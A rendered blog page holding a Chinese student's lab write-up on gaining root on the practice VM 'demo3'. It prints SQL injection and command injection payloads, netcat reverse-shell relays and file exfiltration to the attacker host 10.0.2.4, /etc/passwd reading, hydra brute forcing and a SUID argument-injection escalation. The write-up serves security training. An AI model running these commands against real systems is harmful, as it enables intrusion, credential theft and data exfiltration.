@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>demo_3打靶 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="下面是把你提供的 LaTeX 内容等价整理为 Markdown（仅做排版转换，未改动技术步骤与结论）。可直接粘贴到 Hexo&#x2F;Markdown 编辑器使用。  第 3 次实验：对demo3进行靶机渗透测试并获得 root 权限 一、实验目的 取得目标靶机 demo3 的 root 权限。 使用主机发现、端口扫描等攻击手段。   二、实验内容1) 主机发现首先执行命令： 12sudo -i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="demo_3打靶">
+<meta property="og:url" content="https://www.ffcchhgg.cn/2025/10/22/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/demo-3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="下面是把你提供的 LaTeX 内容等价整理为 Markdown（仅做排版转换，未改动技术步骤与结论）。可直接粘贴到 Hexo&#x2F;Markdown 编辑器使用。  第 3 次实验：对demo3进行靶机渗透测试并获得 root 权限 一、实验目的 取得目标靶机 demo3 的 root 权限。 使用主机发现、端口扫描等攻击手段。   二、实验内容1) 主机发现首先执行命令： 12sudo -i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-1.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-2.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-3.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-4.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-5.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-6.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-7.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-8.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-9.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-10.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-11.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-12.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-13.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-14.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-15.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-16.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-17.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-18.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-19.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-20.png">
+<meta property="og:image" content="https://www.ffcchhgg.cn/imgff/demo-3-21.png">
+<meta property="article:published_time" content="2025-10-22T12:39:28.000Z">
+<meta property="article:modified_time" content="2025-10-29T12:56:10.469Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络攻防">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.ffcchhgg.cn/imgff/demo-3-1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/banner.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Ruofan Wang </div>
+      <div class="dot"></div>
+      <div class="subtitle">Betelgeuse </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/ffcchhgg" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/%E9%AB%98%E7%A8%8B/">
+                高程
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Daily/">
+                Daily
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">
+                网络攻防实战
+                <div class="category-count">4</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Daily/" rel="tag">Daily</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/STL/" rel="tag">STL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%AB%98%E7%A8%8B/" rel="tag">高程</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2025/10/29/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/README/" title="README" >
+            <div class="recent-link-text">
+              README
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/10/22/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/demo-3/" title="demo_3打靶" >
+            <div class="recent-link-text">
+              demo_3打靶
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/10/14/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/demo-2/" title="demo_2打靶" >
+            <div class="recent-link-text">
+              demo_2打靶
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/10/10/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/demo-1/" title="demo_1打靶" >
+            <div class="recent-link-text">
+              demo_1打靶
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/08/07/ICS-PA1-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA/" title="ICS-PA1-最简单的计算机" >
+            <div class="recent-link-text">
+              ICS-PA1-最简单的计算机
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-网络攻防实战/demo-3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        demo_3打靶
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2025-10-22T12:39:28.000Z" itemprop="datePublished">2025-10-22</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            2.2k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>下面是把你提供的 LaTeX 内容<strong>等价整理</strong>为 Markdown（仅做排版转换，未改动技术步骤与结论）。可直接粘贴到 Hexo&#x2F;Markdown 编辑器使用。</p>
+<hr>
+<p><strong>第 3 次实验：对demo3进行靶机渗透测试并获得 root 权限</strong></p>
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ul>
+<li>取得目标靶机 <strong>demo3</strong> 的 <strong>root</strong> 权限。</li>
+<li>使用主机发现、端口扫描等攻击手段。</li>
+</ul>
+<hr>
+<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1) 主机发现"></a>1) 主机发现</h3><p><strong>首先执行命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -i</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-1.png"></p>
+<p>由此得到目标主机地址为 <code>10.0.2.5</code>。</p>
+<hr>
+<h3 id="2-端口发现与扫描"><a href="#2-端口发现与扫描" class="headerlink" title="2) 端口发现与扫描"></a>2) 端口发现与扫描</h3><p>执行以下命令对目标进行扫描（进一步验证是否为靶机；如不考虑时间可 <code>nmap -p- 10.0.2.5</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.0.2.15</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-2.png"></p>
+<p>对靶机进行服务探测，确认端口服务与版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,8080 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-3.png"></p>
+<p>发现 <code>8080</code> 端口为 Web 服务（检索可知是某 Web 开发库）。同时得知目标系统支持 <strong>Python 2.7</strong>。</p>
+<hr>
+<h3 id="3-Web-渗透"><a href="#3-Web-渗透" class="headerlink" title="3) Web 渗透"></a>3) Web 渗透</h3><p>访问 <code>10.0.2.5:8080</code>，页面为“反病毒扫描”平台界面：</p>
+<p><img src="/imgff/demo-3-4.png"></p>
+<p>启用 FoxyProxy → 打开 Burp Suite → 在 <strong>Proxy &#x2F; Intercept on</strong> 状态下随意输入凭据提交，右击拦截请求选择 <strong>Send to Intruder</strong>：</p>
+<p><img src="/imgff/demo-3-5.png"></p>
+<p>在 <strong>Intruder</strong> 中清空标记后仅选中“123”，添加要探测的字符（如 <code>&quot;</code>、<code>$</code> 等），点击 <strong>attack</strong>：</p>
+<p><img src="/imgff/demo-3-6.png"></p>
+<p>观察到 <code>&quot;</code> 的 <strong>status code &#x3D; 500</strong> 且响应长度异常，查看 <strong>response → render</strong>：</p>
+<p><img src="/imgff/demo-3-7.png"></p>
+<p>由报错可知存在<strong>双引号注入</strong>。关闭代理后在登录页输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;or 1=1 #</span><br></pre></td></tr></table></figure>
+
+<p>若报错，再尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;or 1=1 --</span><br></pre></td></tr></table></figure>
+
+<p>成功登录：</p>
+<p><img src="/imgff/demo-3-8.png"></p>
+<p>（也可尝试暴力破解）</p>
+<p>根据页面提示为 <strong>scan</strong> 功能，输入 <code>scan</code>：</p>
+<p><img src="/imgff/demo-3-9.png"></p>
+<p>推测后端可能在命令行调用扫描器，于是用分号&#x2F;管道符测试：<br>输入 <code>bash;whoami</code> 后成功执行（显示用户名 <code>scanner</code>），说明存在<strong>任意命令执行</strong>。</p>
+<hr>
+<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4) 提权"></a>4) 提权</h3><h4 id="提权尝试-1"><a href="#提权尝试-1" class="headerlink" title="提权尝试 1"></a>提权尝试 1</h4><p>已知靶机支持 Python；先检测是否有 <code>nc</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash | which nc</span><br></pre></td></tr></table></figure>
+
+<p>输出 <code>/bin/nc</code>，说明可用 <strong>nc</strong> 串联反弹。</p>
+<p>在 Kali 使用 tmux 分屏，分别监听 <strong>3333</strong> 与 <strong>4444</strong>（左为“会话1”，右为“会话2”）。网页输入并执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 3333 | /bin/bash | nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-10.png"></p>
+<p>获得靶机 shell。会话1 输入 <code>ls</code>，会话2 显示结果；<code>ls -l</code> 可见 4 个文件与 2 个目录：</p>
+<p><img src="/imgff/demo-3-11.png"></p>
+<p>对 <code>database.sql</code> 感兴趣。会话1 执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure>
+
+<p>判断为 SQLite 文件。新开终端监听 <strong>5555</strong> 并保存到本机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure>
+
+<p>会话1 执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.4 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-12.png"></p>
+<p>在本机查看&#x2F;导出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br><span class="line">.open db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-13.png"></p>
+<p>发现 4 个疑似口令值（可用作邀请码&#x2F;密码）。随后在会话1 获取可登录 shell 的用户名列表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-14.png"></p>
+<p>退出 sqlite（<code>.quit</code>），使用 hydra 暴力测试。先在本机创建 <code>user.txt</code> 与 <code>pass.txt</code>（分别包含 3 个用户名与 4 个密码）：</p>
+<p><img src="/imgff/demo-3-15.png"></p>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<p>未成功，转用其他方法。</p>
+<h4 id="提权尝试-2（SUID）"><a href="#提权尝试-2（SUID）" class="headerlink" title="提权尝试 2（SUID）"></a>提权尝试 2（SUID）</h4><p>常见提权方式：</p>
+<ol>
+<li><strong>内核提权</strong>（前两次实验已使用）</li>
+<li><strong>SUID 文件</strong>（以文件属主权限执行）</li>
+</ol>
+<p>本次尝试 <strong>SUID</strong>。为便于分析，将扫描结果保存到文件再下载到本机查看。普通用户直接扫会有大量报错，因此把错误重定向到“黑洞”，正常输出重定向到 <code>/tmp</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u+s 2&gt;/dev/null &gt; /tmp/suid.txt</span><br></pre></td></tr></table></figure>
+
+<p>检查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /tmp/suid.txt</span><br></pre></td></tr></table></figure>
+
+<p>新终端监听 <strong>5555</strong> 保存结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555 &gt; suid.txt</span><br></pre></td></tr></table></figure>
+
+<p>会话1 发送：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.4 5555 &lt; /tmp/suid.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-16.png"></p>
+<p>查看 <code>suid.txt</code>，注意到可疑条目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/scanner/update_cloudav</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgff/demo-3-17.png"></p>
+<p>在会话1 执行 <code>whoami</code>、<code>pwd</code> 后返回上级目录查看，得到漏洞源代码 <strong>updata_cloudav.c</strong>（注：文件名展示为 updata_cloudav.c）：</p>
+<p><img src="/imgff/demo-3-18.png"></p>
+<p>打开源码：</p>
+<p><img src="/imgff/demo-3-19.png"></p>
+<p>可见该可执行文件需要一个参数；利用 <strong>SUID</strong> 特性，执行时将继承文件属主（root）的权限。<br>在 Kali 同时监听 <strong>7777</strong> 与 <strong>8888</strong> 端口，会话1 执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav <span class="string">&quot;a|nc 10.0.2.4 7777 | /bin/bash | nc 10.0.2.4 8888&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>会话3、会话4 成功建立连接：</p>
+<p><img src="/imgff/demo-3-20.png"></p>
+<p>在会话3 输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<p>会话4 显示 <code>root</code> —— <strong>提权成功</strong>。</p>
+<hr>
+<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>通过攻击机 <strong>Kali Linux</strong> 对靶机 <strong>demo3</strong> 进行渗透测试，并成功获得 <strong>root</strong> 权限：</p>
+<p><img src="/imgff/demo-3-21.png"></p>
+<hr>
+<h2 id="四、实验中遇到的问题及解决方案"><a href="#四、实验中遇到的问题及解决方案" class="headerlink" title="四、实验中遇到的问题及解决方案"></a>四、实验中遇到的问题及解决方案</h2><ul>
+<li><strong>问题：</strong> 拿到低权限 shell 后，查看 <code>database.sql</code> 并尝试以用户名&#x2F;密码暴力破解，未果。</li>
+<li><strong>解决：</strong> 改用 <strong>SUID 文件</strong> 特性进行提权，成功获取 root。</li>
+</ul>
+<hr>
+<h2 id="五、实验的启示-意见和建议"><a href="#五、实验的启示-意见和建议" class="headerlink" title="五、实验的启示 &#x2F; 意见和建议"></a>五、实验的启示 &#x2F; 意见和建议</h2><ul>
+<li>流程与前两次类似：先拿到低权限 shell，再寻找提权面。</li>
+<li>本次未用内核漏洞，而是抓住 <strong>SUID</strong> 的“以属主权限执行”特性：定位 SUID → 下载到本机分析 → 回靶机利用。</li>
+<li>掌握了利用 SUID 文件提权的完整思路与操作。</li>
+</ul>
+<hr>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2025/10/29/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/README/"
+      title="README"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        README
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2025/10/14/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/demo-2/"
+      title="demo_2打靶"
+     >
+
+    <p class="title-text">
+      
+        demo_2打靶
+        
+    </p>
